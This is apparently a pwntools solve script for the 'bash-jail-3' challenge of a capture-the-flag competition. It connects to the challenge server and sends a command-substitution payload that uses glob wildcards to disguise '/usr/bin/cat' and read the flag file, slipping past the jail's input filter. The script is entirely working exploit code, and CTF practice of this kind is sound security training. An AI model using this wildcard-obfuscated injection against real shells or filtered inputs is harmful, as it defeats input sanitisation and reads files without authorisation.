# bash-jail-3 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5007
context.log_level = "debug"

io = remote(HOST, PORT)

io.recv()

payload = b"$(/u??/b??/ca? /flag.???)"
io.sendline(payload)

io.recv()
io.interactive()
